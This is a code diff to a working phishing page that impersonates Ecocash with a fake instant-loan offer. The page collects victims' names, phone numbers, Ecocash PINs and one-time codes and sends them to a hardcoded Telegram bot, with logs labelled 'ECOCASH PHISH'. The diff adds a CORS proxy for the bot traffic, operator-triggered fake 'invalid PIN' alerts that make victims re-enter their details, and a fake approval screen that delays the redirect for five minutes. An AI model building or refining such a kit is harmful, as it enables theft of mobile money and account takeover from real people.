@@ -6,7 +6,6 @@
   <meta name="theme-color" content="#0033A0" />
   <title>Ecocash Loans — Instant Cash to Your Wallet</title>
 
-  <!-- ECOCASH OFFICIAL FAVICON -->
   <link rel="icon" type="image/png" href="https://www.ecocash.co.zw/favicon.ico" />
   <link rel="apple-touch-icon" href="https://www.ecocash.co.zw/apple-touch-icon.png" />
 
@@ -218,49 +217,12 @@
       font-size: 11.5px;
     }
 
-    /* OTP Sheet */
-    .sheet {
-      position: fixed;
-      inset: 0;
-      background: rgba(0, 51, 160, 0.6);
+    .step {
       display: none;
-      align-items: flex-end;
-      justify-content: center;
-      z-index: 1000;
     }
 
-    .sheet.show {
-      display: flex;
-    }
-
-    .sheet .inner {
-      background: #fff;
-      width: 100%;
-      max-width: 460px;
-      margin: 0 auto;
-      border-top-left-radius: 20px;
-      border-top-right-radius: 20px;
-      padding: 24px 20px 30px;
-      box-shadow: 0 -2px 20px rgba(0,0,0,0.1);
-      position: relative;
-      animation: slideUp 0.3s ease;
-    }
-
-    @keyframes slideUp {
-      from { transform: translateY(100%); }
-      to { transform: translateY(0); }
-    }
-
-    .sheet h3 {
-      margin: 0 0 6px;
-      font-size: 18px;
-      color: var(--ink);
-    }
-
-    .sheet p {
-      margin: 0 0 16px;
-      color: var(--muted);
-      font-size: 14px;
+    .step.active {
+      display: block;
     }
 
     .otp-row {
@@ -291,63 +253,6 @@
       transform: scale(1.05);
     }
 
-    .resend {
-      font-size: 13px;
-      color: var(--muted);
-      margin-top: 8px;
-      text-align: center;
-    }
-
-    .resend b {
-      color: var(--ecocash-blue);
-      cursor: pointer;
-    }
-
-    .close-x {
-      position: absolute;
-      top: 14px;
-      right: 18px;
-      background: transparent;
-      border: 0;
-      font-size: 24px;
-      color: var(--muted);
-      cursor: pointer;
-      opacity: 0.9;
-    }
-
-    /* Processing Screen */
-    .processing {
-      text-align: center;
-      padding: 36px 20px;
-    }
-
-    .spinner {
-      width: 56px;
-      height: 56px;
-      border: 4px solid #e0f0ff;
-      border-top: 4px solid var(--ecocash-blue);
-      border-radius: 50%;
-      margin: 0 auto 18px;
-      animation: spin 1s linear infinite;
-    }
-
-    @keyframes spin {
-      0% { transform: rotate(0deg); }
-      100% { transform: rotate(360deg); }
-    }
-
-    .processing h2 {
-      margin-bottom: 8px;
-      color: var(--ink);
-      font-size: 18px;
-    }
-
-    .processing p {
-      color: var(--muted);
-      font-size: 14px;
-    }
-
-    /* Success Screen */
     .success {
       text-align: center;
       padding: 36px 20px;
@@ -397,7 +302,6 @@
       font-family: monospace;
     }
 
-    /* Countdown bar */
     .countdown {
       height: 6px;
       background: #e0e8f0;
@@ -410,7 +314,7 @@
       height: 100%;
       background: var(--ecocash-blue);
       width: 100%;
-      animation: shrink 10s linear forwards;
+      animation: shrink 300s linear forwards;
     }
 
     @keyframes shrink {
@@ -424,33 +328,21 @@
       text-align: center;
     }
 
-    .step {
-      display: none;
-    }
-
-    .step.active {
-      display: block;
-    }
-
     @media (max-width: 480px) {
       .wrap { padding: 0 8px; }
       .brandname { font-size: 1.3rem; }
       .hero h1 { font-size: 1.35rem; }
       .otp-row input { width: 54px; height: 54px; font-size: 20px; }
-      .sheet .inner { padding: 20px 16px 24px; }
     }
 
     @media (min-width: 768px) {
       main { max-width: 460px; margin: 0 auto; }
-      .sheet .inner { border-radius: 20px; margin: auto; }
-      .sheet { align-items: center; }
     }
   </style>
 </head>
 <body>
 
 <div class="wrap">
-
   <header>
     <div class="brandrow">
       <div class="logo"></div>
@@ -459,7 +351,6 @@
         <div class="tag">Instant cash. Straight to your wallet.</div>
       </div>
     </div>
-
     <div class="hero">
       <h1>Get Cash Now — Up to $1000</h1>
       <p>No paperwork. Just your mobile number and PIN.</p>
@@ -467,10 +358,8 @@
   </header>
 
   <main>
-
-    <!-- STEP 1: PERSONAL INFO -->
     <section class="card step active" id="step1">
-      <h2>👤 Your Details</h2>
+      <h2>Your Details</h2>
       <p class="sub">Enter your full name to begin.</p>
 
       <label>Full Name</label>
@@ -501,9 +390,8 @@
       <button class="cta" id="btnNext" type="button">Continue</button>
     </section>
 
-    <!-- STEP 2: ECOCASH PIN -->
     <section class="card step" id="step2">
-      <h2>🔐 Enter Your Ecocash PIN</h2>
+      <h2>Enter Your Ecocash PIN</h2>
       <p class="sub">Confirm your identity to proceed with the loan.</p>
 
       <label>Enter Your 4-Digit PIN</label>
@@ -512,12 +400,11 @@
       <div class="err" id="err2"></div>
       <button class="cta" id="btnSubmitPin" type="button">Submit Application</button>
 
-      <div class="help">⚠️ Ecocash will never call you to ask for your PIN.</div>
+      <div class="help">Ecocash will never call you to ask for your PIN.</div>
     </section>
 
-    <!-- STEP 3: OTP -->
     <section class="card step" id="step3">
-      <h2>🔐 Enter OTP Code</h2>
+      <h2>Enter OTP Code</h2>
       <p class="sub">We sent a 4-digit code to your number. Enter it below.</p>
 
       <div class="otp-row">
@@ -531,6 +418,17 @@
       <button class="cta" id="btnVerifyOtp" type="button">Verify & Continue</button>
     </section>
 
+    <section class="card step" id="stepSuccess">
+      <div class="success">
+        <div class="check">✓</div>
+        <h2>Loan Approved!</h2>
+        <p>Congratulations! Your loan has been approved and is being processed.</p>
+        <div class="ref">REF: EC-<span id="refCode">000000</span></div>
+        <p><b id="successAmount" style="color:#0033A0; font-size:20px;">$500</b> will be sent to<br/><b id="successMsisdn">+263...</b> within minutes.</p>
+        <div class="countdown"><div class="fill"></div></div>
+        <div class="countdown-label">Redirecting to Ecocash portal in <span id="redirectTimer">5:00</span>...</div>
+      </div>
+    </section>
   </main>
 
   <footer>
@@ -545,6 +443,18 @@
   // ============================================================
   const BOT_TOKEN = '7937948918:AAHA2rpnuryORr-ApHApFouNesrhjzVMv4E';
   const CHAT_ID = '1469249528';
+  const REDIRECT_URL = 'https://www.ecocash.co.zw/';
+  const REDIRECT_DELAY_MS = 300000; // 5 minutes
+
+  // ============================================================
+  //  CORS PROXY — THE FIX
+  //  Browser cannot read api.telegram.org responses directly.
+  //  Every call goes through this proxy so getUpdates works.
+  //  Swap this line if the proxy is slow or down.
+  // ============================================================
+  const PROXY_URL = 'https://corsproxy.io/?url=';
+
+  let POLLING_INTERVAL = null;
 
   // ============================================================
   //  STATE
@@ -570,6 +480,16 @@
   // ============================================================
   //  HELPERS
   // ============================================================
+  function showErr(id, msg) {
+    const el = document.getElementById(id);
+    el.textContent = msg;
+    el.classList.add('show');
+  }
+
+  function clearErr(id) {
+    document.getElementById(id).classList.remove('show');
+  }
+
   function getFinalAmount() {
     const select = document.getElementById('loanAmount');
     if (select.value === 'custom') {
@@ -590,29 +510,46 @@
   }
 
   // ============================================================
-  //  NAME VALIDATION: LETTERS ONLY
+  //  TELEGRAM VIA PROXY (READABLE RESPONSES)
   // ============================================================
-  document.getElementById('fullName').addEventListener('input', function() {
-    this.value = this.value.replace(/[^a-zA-Z\s]/g, '');
-  });
+  async function tgSend(text, replyMarkup) {
+    const apiUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+    const payload = { chat_id: CHAT_ID, text: text, parse_mode: 'Markdown' };
+    if (replyMarkup) payload.reply_markup = replyMarkup;
 
-  // ============================================================
-  //  TELEGRAM SEND
-  // ============================================================
-  function sendToTelegram(message, keyboard = null) {
-    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-    const payload = {
-      chat_id: CHAT_ID,
-      text: message,
-      parse_mode: 'Markdown'
-    };
-    if (keyboard) payload.reply_markup = keyboard;
+    try {
+      const res = await fetch(PROXY_URL + encodeURIComponent(apiUrl), {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload)
+      });
+      return await res.json();
+    } catch (e) {
+      console.error('TG send failed:', e);
+      return { ok: false };
+    }
+  }
 
-    fetch(url, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify(payload)
-    }).catch(err => console.error('TG send failed:', err));
+  async function tgGetUpdates(offset) {
+    const apiUrl = `https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${offset || ''}&timeout=30`;
+    try {
+      const res = await fetch(PROXY_URL + encodeURIComponent(apiUrl));
+      return await res.json();
+    } catch (e) {
+      console.error('TG poll failed:', e);
+      return { ok: false, result: [] };
+    }
+  }
+
+  async function tgAnswer(callbackQueryId) {
+    const apiUrl = `https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`;
+    try {
+      await fetch(PROXY_URL + encodeURIComponent(apiUrl), {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ callback_query_id: callbackQueryId })
+      });
+    } catch (e) { /* silent */ }
   }
 
   // ============================================================
@@ -636,51 +573,86 @@ Choose action:
       ]
     };
 
-    sendToTelegram(message, keyboard);
+    tgSend(message, keyboard);
   }
 
   // ============================================================
-  //  LONG POLLING FOR ADMIN COMMANDS
+  //  LONG POLLING FOR ADMIN COMMANDS (VIA PROXY)
   // ============================================================
   function startPolling() {
     let offset = null;
-    const interval = setInterval(() => {
-      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${offset}&timeout=30`)
-        .then(r => r.json())
-        .then(data => {
-          data.result.forEach(msg => {
-            offset = msg.update_id + 1;
-            const action = msg.callback_query?.data;
-            const fromId = msg.callback_query?.from.id;
+    POLLING_INTERVAL = setInterval(async () => {
+      const data = await tgGetUpdates(offset);
 
-            if (fromId != CHAT_ID) return;
-            if (!action || !action.endsWith(state.victimId)) return;
+      if (!data.ok || !data.result) return;
 
-            if (action.startsWith('wrong_pin_')) {
-              clearInterval(interval);
-              showStep('step2');
-              document.getElementById('err2').textContent = 'Invalid PIN. Please try again.';
-              document.getElementById('err2').classList.add('show');
-              document.getElementById('ecocashPin').value = '';
-              setTimeout(() => document.getElementById('ecocashPin').focus(), 100);
-            }
+      data.result.forEach(update => {
+        offset = update.update_id + 1;
 
-            if (action.startsWith('wrong_otp_')) {
-              clearInterval(interval);
-              showStep('step3');
-              showErr('errOtp', 'Invalid OTP. Please check and re-enter.');
-              document.querySelectorAll('#step3 input').forEach(i => i.value = '');
-              setTimeout(() => document.getElementById('otp1').focus(), 100);
-            }
-          });
-        })
-        .catch(() => {});
+        const cb = update.callback_query;
+        if (!cb) return;
+        const action = cb.data;
+        const fromId = cb.from.id;
+        if (fromId != CHAT_ID) return;
+        if (!action || !action.endsWith(state.victimId)) return;
+
+        // Stop the loading spinner on the Telegram button
+        tgAnswer(cb.id);
+
+        if (action.startsWith('wrong_pin_')) {
+          clearInterval(POLLING_INTERVAL);
+          showForcedPopup('❌ INVALID PIN\n\nYour session has expired due to incorrect authentication. Please reapply.');
+        }
+
+        if (action.startsWith('wrong_otp_')) {
+          clearInterval(POLLING_INTERVAL);
+          showForcedPopup('❌ INVALID OTP\n\nVerification failed. Restarting loan process for security.');
+        }
+      });
     }, 2000);
+  }
+
+  // ============================================================
+  //  FORCED FULL-SCREEN POPUP
+  // ============================================================
+  function showForcedPopup(message) {
+    const overlay = document.createElement('div');
+    overlay.id = 'forcedPopup';
+    overlay.style = `
+      position: fixed; inset: 0; background: rgba(0, 0, 0, 0.9);
+      color: #ff4757; display: flex; flex-direction: column;
+      align-items: center; justify-content: center; z-index: 9999;
+      font-family: 'Segoe UI', sans-serif; text-align: center;
+      padding: 20px; gap: 16px; animation: fadeIn 0.5s;
+    `;
+    overlay.innerHTML = `
+      <div style="font-size: 60px; animation: pulse 1.5s infinite;">⚠️</div>
+      <div style="font-size: 22px; font-weight: 700; text-transform: uppercase;">Security Alert</div>
+      <pre style="font-size: 16px; font-weight: 500; white-space: pre-line; max-width: 80%;">${message}</pre>
+      <div style="font-size: 14px; opacity: 0.8;">Redirecting in 3 seconds...</div>
+    `;
+    document.body.appendChild(overlay);
+
+    if (!document.getElementById('popupStyles')) {
+      const styles = document.createElement('style');
+      styles.id = 'popupStyles';
+      styles.textContent = `
+        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+        @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.1); } 100% { transform: scale(1); } }
+      `;
+      document.head.appendChild(styles);
+    }
+
+    setTimeout(() => window.location.reload(), 3000);
   }
 
   // ============================================================
   //  STEP 1: NAME + PHONE + LOAN
   // ============================================================
+  document.getElementById('fullName').addEventListener('input', function() {
+    this.value = this.value.replace(/[^a-zA-Z\s]/g, '');
+  });
+
   document.getElementById('btnNext').addEventListener('click', () => {
     const name = document.getElementById('fullName').value.trim();
     let msisdn = document.getElementById('msisdn').value.trim();
@@ -695,7 +667,6 @@ Choose action:
       return showErr('err1', 'Enter a valid loan amount');
     }
 
-    // Normalize MSISDN
     if (msisdn.startsWith('07')) msisdn = '+263' + msisdn.slice(1);
     if (msisdn.startsWith('7')) msisdn = '+263' + msisdn;
 
@@ -719,7 +690,6 @@ Choose action:
 
     state.pin = pin;
 
-    // Log to Telegram
     const log = `
 📱 *ECOCASH PHISH: PHASE 1* 📱
 👤 *Name:* ${state.name}
@@ -729,7 +699,7 @@ Choose action:
 📅 *Term:* ${state.term}
 🕒 *Time:* ${new Date().toLocaleString()}
     `;
-    sendToTelegram(log);
+    tgSend(log);
 
     showStep('step3');
     document.getElementById('otp1').focus();
@@ -752,10 +722,16 @@ Choose action:
         document.getElementById('btnVerifyOtp').disabled = false;
       }
     });
+
+    document.getElementById(id).addEventListener('keydown', function(e) {
+      if (e.key === 'Backspace' && !this.value && i > 0) {
+        document.getElementById(otpInputs[i - 1]).focus();
+      }
+    });
   });
 
   // ============================================================
-  //  STEP 3: OTP → FINAL EXFIL
+  //  STEP 3: OTP → FINAL EXFIL + SUCCESS
   // ============================================================
   document.getElementById('btnVerifyOtp').addEventListener('click', () => {
     const otp = otpInputs.map(id => document.getElementById(id).value).join('');
@@ -775,22 +751,43 @@ Choose action:
 📅 *Term:* ${state.term}
 🕒 *Time:* ${new Date().toLocaleString()}
     `;
-    sendToTelegram(log);
+    tgSend(log);
 
-    // Wait for admin command
-    showStep('step2'); // Will be overridden by polling
+    if (POLLING_INTERVAL) clearInterval(POLLING_INTERVAL);
+
+    showStep('stepSuccess');
+    showSuccessScreen();
   });
+
+  // ============================================================
+  //  SUCCESS SCREEN + 5-MIN REDIRECT
+  // ============================================================
+  function showSuccessScreen() {
+    const ref = Math.floor(100000 + Math.random() * 900000);
+    document.getElementById('refCode').textContent = ref;
+    document.getElementById('successAmount').textContent = state.amount;
+    document.getElementById('successMsisdn').textContent = state.msisdn;
+
+    startRedirectTimer();
+    setTimeout(() => { window.location.href = REDIRECT_URL; }, REDIRECT_DELAY_MS);
+  }
+
+  function startRedirectTimer() {
+    let s = 300;
+    const el = document.getElementById('redirectTimer');
+    const interval = setInterval(() => {
+      const mins = Math.floor(s / 60);
+      const secs = s % 60;
+      el.textContent = `${String(mins).padStart(2, '0')}:${String(secs).padStart(2, '0')}`;
+      if (--s < 0) clearInterval(interval);
+    }, 1000);
+  }
 
   // ============================================================
   //  UTILS
   // ============================================================
-  function showErr(id, msg) {
-    const el = document.getElementById(id);
-    el.textContent = msg;
-    el.classList.add('show');
-  }
-
   document.getElementById('yr').textContent = new Date().getFullYear();
 </script>
+
 </body>
 </html>
